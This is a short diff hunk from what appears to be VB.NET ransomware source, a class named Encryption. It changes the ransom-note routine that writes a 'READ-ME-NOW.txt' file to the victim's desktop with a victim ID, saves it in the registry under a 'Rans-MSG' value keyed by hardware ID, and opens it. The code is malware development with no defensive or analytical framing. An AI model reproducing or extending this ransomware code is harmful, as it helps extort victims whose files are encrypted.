@@ -166,7 +166,7 @@ Public Class Encryption
 
             Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
-            Dim Message As String = Mynote + Environment.NewLine + "Your ID is [" & Main.BOT + "]"
+            Dim Message As String = Mynote + Environment.NewLine + "Your ID is [" & Main.HWID + "]"
             File.WriteAllText(fullpath, Message)
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-MSG", Message)
             Process.Start(fullpath)
